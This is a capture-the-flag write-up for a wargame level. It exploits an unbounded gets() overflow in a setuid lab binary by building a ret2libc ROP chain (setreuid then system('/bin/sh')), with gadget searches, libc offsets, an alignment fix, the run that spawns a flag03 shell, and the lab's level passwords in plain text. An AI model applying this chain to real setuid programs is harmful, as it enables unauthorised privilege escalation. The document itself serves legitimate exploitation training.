# level03 — pentest report

## Concept

Classic unbounded `gets()` stack overflow → ret2libc. First level in this
progression with NX enabled (non-executable stack), so the
shellcode-in-buffer techniques from level00-02 are no longer an option —
control has to be redirected into existing libc code instead of injected
bytes. No hidden "win function" this time either (unlike level01); the
whole exploit is built from ordinary libc functions and gadgets.

## Recon

```
level02@rainfall:~$ ssh level03@<vm-ip> -p 4242    # password = level02's flag: qeplvibynup98phqb312dkvhtpdkklac
level03@rainfall:~$ id
uid=1004(level03) gid=1006(level03) groups=1006(level03),1001(levelgroup)
level03@rainfall:~$ ls -la
-rwsr-x---  1 flag03  level03 16512 Jun  9 23:13 armitage
-r--r--r--  1 level03 level03  1823 Jun  9 23:13 armitage.c
-rw-r--r--  1 level03 level03    30 Jun  9 23:12 .gdbinit
-r--r--r--  1 level03 level03    37 Jun  9 23:13 README
level03@rainfall:~$ cat README
Armitage always had a plan. Find it.
```

```
level03@rainfall:~$ cat armitage.c
```
Full source. `queue_job()`:
```c
static void queue_job(void)
{
    char msg[MSG_SIZE];   /* MSG_SIZE == 128 */
    ...
    gets(msg);
    if (!validate_job(msg)) {
        printf("[ARMITAGE] Invalid job format. Expected JOB:<data>\n");
        return;
    }
    ...
}
```
`gets()` — completely unbounded, no size argument exists for it at all
(unlike level00-02's `read()`/`fgets`-style calls that at least took a
length, just an insufficient one). `validate_job()` just checks a `"JOB"`
prefix and minimum length; both the valid- and invalid-format paths fall
through to the same `queue_job` epilogue.

```
level03@rainfall:~$ checksec --file=./armitage
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
level03@rainfall:~$ cat /proc/sys/kernel/randomize_va_space
0
level03@rainfall:~$ nm ./armitage | grep -i " t "
0000000000401216 t init_queue
000000000040123a t print_banner
000000000040144a t process_jobs
00000000004012eb t queue_job
000000000040128b t validate_job
...
level03@rainfall:~$ ldd ./armitage
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
```
Mitigation progression as promised by the subject: NX is now on (first
level where it is), still no canary, no PIE, ASLR off system-wide. Symbol
table confirms there is no hidden win-function analogous to level01's
`maintenance_exec` — every `t`/`T` symbol matches a function already
visible in the source. Same libc load base (`0x7ffff7c00000`) as every
prior level, confirming ASLR really is globally disabled, not just
per-binary.

```
level03@rainfall:~$ objdump -d -M intel ./armitage | sed -n '/<queue_job>:/,/^$/p'
4012eb: endbr64
4012ef: push rbp
4012f0: mov rbp,rsp
4012f3: add rsp,0xffffffffffffff80   ; i.e. sub rsp,0x80 -- msg[128]
...
40133e: lea rax,[rbp-0x80]           ; msg's address confirmed at rbp-0x80
...
401345: call gets@plt
...
401448: leave
401449: ret
```
`msg` at `rbp-0x80` (128 bytes), no padding. Offset to the saved return
address = 128 (buffer) + 8 (saved rbp) = 136 bytes.

Since NX rules out shellcode-in-buffer, and libc's load address is fixed
and known, the plan from the start was a ret2libc via `system("/bin/sh")`
— gathered the pieces needed:
```
level03@rainfall:~$ LIBC=/lib/x86_64-linux-gnu/libc.so.6
level03@rainfall:~$ nm -D $LIBC | grep -w system
0000000000058750 W system@@GLIBC_2.2.5
level03@rainfall:~$ strings -t x $LIBC | grep "^.*\ /bin/sh$"
 1cb42f /bin/sh
level03@rainfall:~$ ROPgadget --binary $LIBC --only "pop|ret" | grep "pop rdi"
0x000000000010f78b : pop rdi ; ret
```
`pop rdi ; ret` at libc offset `0x10f78b` — the exact same gadget already
used in level00/01's recon, further confirming this is the identical libc
build/mapping across the whole VM, not a coincidence.

## Retrieving the addresses, command by command

A plain `pop rdi;ret` → `"/bin/sh"` → `system` chain at offset 136 didn't
spawn a shell on the first attempts. Under gdb (safe here, since — unlike
level02 — this exploit uses zero runtime stack addresses, only fixed
libc/.text addresses, so gdb's stack-shifting quirk from level02 doesn't
apply), the crash trace showed `system()` had actually forked and exec'd
`/bin/sh` successfully and only then segfaulted trying to `ret` back into
a chain with nothing placed after it — consistent with the well-documented
modern-glibc requirement that `system()` (and other functions using
SSE-optimized internals) need `rsp % 16 == 8` at entry, as if reached via
a real `call`. Jumping in via a bare `ret` after `pop rdi;ret` leaves the
alignment off by one gadget-worth of pushes, so a plain `ret`-only gadget
is needed to pad it:
```
level03@rainfall:~$ ROPgadget --binary $LIBC --only "ret"
0x000000000002882f : ret
```
With the chain rebuilt as `pop rdi;ret` → `"/bin/sh"` → bare `ret`
(alignment fixup) → `system`, and tested with a continuous pipe (follow-up
marker commands after a `sleep 2`, matching every prior level's working
pattern):
```
level03@rainfall:~$ (cat payload.bin; printf '\n'; sleep 2; printf 'echo MARKER_OK\nid\ncat /home/flag03/.pass\nexit\n') \
    | ssh level03@<vm-ip> -p 4242 ./armitage
MARKER_OK
uid=1004(level03) gid=1006(level03) groups=1006(level03),1001(levelgroup)
cat: /home/flag03/.pass: Permission denied
```
The alignment fix was correct and `system("/bin/sh")` now spawns a real,
interactive shell reading the follow-up commands — but its `uid` is still
`level03`, not `flag03`: the same "privilege-dropping shell" lesson from
level00/01, just resurfacing here via `/bin/sh` invoked through `system()`
instead of a directly-`execve`d shell from custom shellcode (NX means
there's no shellcode this time to put the `setreuid()` call in — it has
to be its own ROP stage instead). That needs flag03's exact numeric uid
and a second libc function plus a `pop rsi` gadget:
```
level03@rainfall:~$ getent passwd flag03
flag03:x:1020:1022::/home/flag03:/usr/sbin/nologin
level03@rainfall:~$ nm -D $LIBC | grep -w setreuid
00000000001270d0 W setreuid@@GLIBC_2.2.5
level03@rainfall:~$ ROPgadget --binary $LIBC --only "pop|ret" | grep "pop rsi"
0x0000000000110a7d : pop rsi ; ret
```
That `pop rsi ; ret` gadget's address (`0x7ffff7d10a7d`) has a `0x0a` byte
as its second byte, which `gets()` would truncate the whole payload on
before the chain could even finish loading — checked and rejected before
ever sending it live, learned proactively after level00/01's `0x0a`-byte
lesson. A byte-clean alternative was used instead:
```
level03@rainfall:~$ ROPgadget --binary $LIBC --only "pop|ret" | grep "pop rsi"
0x000000000002b46b : pop rsi ; pop rbp ; ret     # 0x7ffff7c2b46b -- clean, one extra junk qword needed
```
Every address in the full 9-gadget chain (`pop rdi;ret` / `FLAG03_UID` /
`pop rsi;pop rbp;ret` / `FLAG03_UID` / junk-rbp / `setreuid` /
`pop rdi;ret` / `"/bin/sh"` / alignment-`ret` / `system`) was checked for
`0x0a` bytes programmatically before sending:
```python
>>> any(0x0a in struct.pack("<Q", v) for v in all_chain_values)
False
```

## Exploit

```
level03@rainfall:~$ python3 exploit.py > payload.bin
level03@rainfall:~$ (cat payload.bin; printf '\n'; sleep 2; printf 'echo MARKER_OK\nid\ncat /home/flag03/.pass\nexit\n') \
    | ssh level03@<vm-ip> -p 4242 ./armitage
MARKER_OK
uid=1020(flag03) gid=1006(level03) groups=1006(level03),1001(levelgroup)
8c33zqo7hytqnsx9h3nb4juf3rdjbd80
```

1. Overflow `msg[128]` with 136 bytes of junk to reach the saved return
   address (no canary to defeat, straight overwrite).
2. `pop rdi;ret` → `1020` (flag03's uid) → `pop rsi;pop rbp;ret` → `1020`
   → junk → `setreuid` — syncs real and effective uid before spawning
   anything, so the shell won't drop back to `level03`.
3. `pop rdi;ret` → `"/bin/sh"` string address → bare `ret` (stack-
   alignment fixup) → `system` — spawns `/bin/sh -c /bin/sh`, an
   interactive shell inheriting our stdin/stdout, now with a fully
   synced uid.

Verified as the real level04 password:
```
level03@rainfall:~$ ssh level04@<vm-ip> -p 4242
Password: 8c33zqo7hytqnsx9h3nb4juf3rdjbd80
level04@rainfall:~$ id
uid=1005(level04) ...
```

